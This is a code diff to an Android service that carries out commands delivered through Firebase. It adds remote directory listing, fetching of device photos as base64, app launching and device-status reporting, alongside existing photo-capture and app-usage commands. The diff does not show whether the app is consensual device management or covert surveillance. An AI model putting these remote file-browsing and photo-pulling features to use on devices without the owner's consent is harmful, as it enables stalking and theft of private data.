@@ -115,6 +115,167 @@ class FirebaseCommandService : Service() {
             "PLAY_ALARM" -> playRemoteAlarm()
             "GET_APP_USAGE" -> getAppUsageStats()
             "CAPTURE_PHOTO" -> capturePhoto()
+            "GET_DEVICE_INFO" -> getDetailedDeviceInfo()
+            else -> {
+                if (command.startsWith("LAUNCH_APP:")) {
+                    val pkgName = command.removePrefix("LAUNCH_APP:").trim()
+                    launchApp(pkgName)
+                } else if (command.startsWith("LIST_FILES:")) {
+                    val path = command.removePrefix("LIST_FILES:").trim()
+                    listFiles(path)
+                } else if (command.startsWith("FETCH_PIC:")) {
+                    val path = command.removePrefix("FETCH_PIC:").trim()
+                    fetchPic(path)
+                }
+            }
+        }
+    }
+
+    private fun listFiles(path: String) {
+        try {
+            val dir = java.io.File(path)
+            if (!dir.exists() || !dir.isDirectory) {
+                postResult("ERROR", "Directory does not exist or is not a directory: $path")
+                return
+            }
+
+            val files = dir.listFiles() ?: arrayOf()
+            val fileList = mutableListOf<Map<String, Any>>()
+
+            for (file in files) {
+                val name = file.name
+                val isDir = file.isDirectory
+                val size = if (isDir) 0 else file.length()
+
+                val type = if (isDir) {
+                    "FOLDER"
+                } else if (name.endsWith(".jpg", true) || name.endsWith(".jpeg", true) || name.endsWith(".png", true) || name.endsWith(".webp", true)) {
+                    "PICTURE"
+                } else if (name.endsWith(".mp4", true) || name.endsWith(".mkv", true) || name.endsWith(".webm", true)) {
+                    "VIDEO"
+                } else {
+                    "OTHER"
+                }
+
+                fileList.add(mapOf(
+                    "name" to name,
+                    "path" to file.absolutePath,
+                    "isDir" to isDir,
+                    "size" to size,
+                    "type" to type
+                ))
+            }
+
+            val resultJson = com.google.gson.Gson().toJson(mapOf(
+                "currentPath" to path,
+                "files" to fileList
+            ))
+
+            postResult("FILE_LIST", resultJson)
+        } catch (e: Exception) {
+            postResult("ERROR", "Failed to list files: ${e.message}")
+        }
+    }
+
+    private fun fetchPic(path: String) {
+        try {
+            val file = java.io.File(path)
+            if (!file.exists() || !file.isFile) {
+                postResult("ERROR", "File does not exist: $path")
+                return
+            }
+
+            // aggressive compression to fit in firebase
+            val options = android.graphics.BitmapFactory.Options()
+            options.inJustDecodeBounds = true
+            android.graphics.BitmapFactory.decodeFile(path, options)
+
+            val maxDim = 800
+            var scale = 1
+            if (options.outHeight > maxDim || options.outWidth > maxDim) {
+                scale = Math.pow(2.0, Math.ceil(Math.log(Math.max(options.outHeight, options.outWidth).toDouble() / maxDim) / Math.log(0.5)).toInt() * -1.0).toInt()
+            }
+
+            options.inJustDecodeBounds = false
+            options.inSampleSize = scale
+
+            val bitmap = android.graphics.BitmapFactory.decodeFile(path, options)
+            if (bitmap == null) {
+                 postResult("ERROR", "Failed to decode image.")
+                 return
+            }
+
+            val outputStream = java.io.ByteArrayOutputStream()
+            bitmap.compress(android.graphics.Bitmap.CompressFormat.JPEG, 60, outputStream)
+            val byteArray = outputStream.toByteArray()
+            val base64 = android.util.Base64.encodeToString(byteArray, android.util.Base64.DEFAULT)
+
+            postResult("IMAGE", base64)
+        } catch (e: Exception) {
+            postResult("ERROR", "Failed to fetch picture: ${e.message}")
+        }
+    }
+
+    private fun launchApp(packageName: String) {
+        try {
+            val intent = packageManager.getLaunchIntentForPackage(packageName)
+            if (intent != null) {
+                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                startActivity(intent)
+                postResult("TEXT", "Successfully launched app: $packageName")
+            } else {
+                postResult("ERROR", "App not found or cannot be launched: $packageName")
+            }
+        } catch (e: Exception) {
+            postResult("ERROR", "Failed to launch app: ${e.message}")
+        }
+    }
+
+    private fun getDetailedDeviceInfo() {
+        try {
+            val sb = java.lang.StringBuilder()
+            sb.append("--- Detailed Device Info ---\n")
+            sb.append("Model: ${Build.MANUFACTURER} ${Build.MODEL}\n")
+            sb.append("OS Version: Android ${Build.VERSION.RELEASE} (API ${Build.VERSION.SDK_INT})\n\n")
+
+            // Battery
+            val batteryStatus = registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
+            if (batteryStatus != null) {
+                val level = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1)
+                val scale = batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1)
+                val status = batteryStatus.getIntExtra(BatteryManager.EXTRA_STATUS, -1)
+                val isCharging = status == BatteryManager.BATTERY_STATUS_CHARGING || status == BatteryManager.BATTERY_STATUS_FULL
+                if (level != -1 && scale != -1) {
+                    val batteryPct = level * 100 / scale.toFloat()
+                    sb.append("Battery: ${batteryPct.toInt()}% (${if (isCharging) "Charging" else "Discharging"})\n")
+                }
+            }
+
+            // Storage
+            val internalStat = android.os.StatFs(android.os.Environment.getDataDirectory().path)
+            val availableSpaceMB = internalStat.availableBlocksLong * internalStat.blockSizeLong / (1024 * 1024)
+            val totalSpaceMB = internalStat.blockCountLong * internalStat.blockSizeLong / (1024 * 1024)
+            sb.append("Internal Storage: ${availableSpaceMB}MB free of ${totalSpaceMB}MB\n")
+
+            // Network
+            val connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
+            val network = connectivityManager.activeNetwork
+            val capabilities = connectivityManager.getNetworkCapabilities(network)
+            if (capabilities != null) {
+                if (capabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI)) {
+                    sb.append("Network: Connected to Wi-Fi\n")
+                } else if (capabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR)) {
+                    sb.append("Network: Connected to Cellular\n")
+                } else {
+                    sb.append("Network: Connected (Other)\n")
+                }
+            } else {
+                sb.append("Network: Disconnected\n")
+            }
+
+            postResult("TEXT", sb.toString())
+        } catch (e: Exception) {
+            postResult("ERROR", "Failed to fetch detailed info: ${e.message}")
         }
     }
 
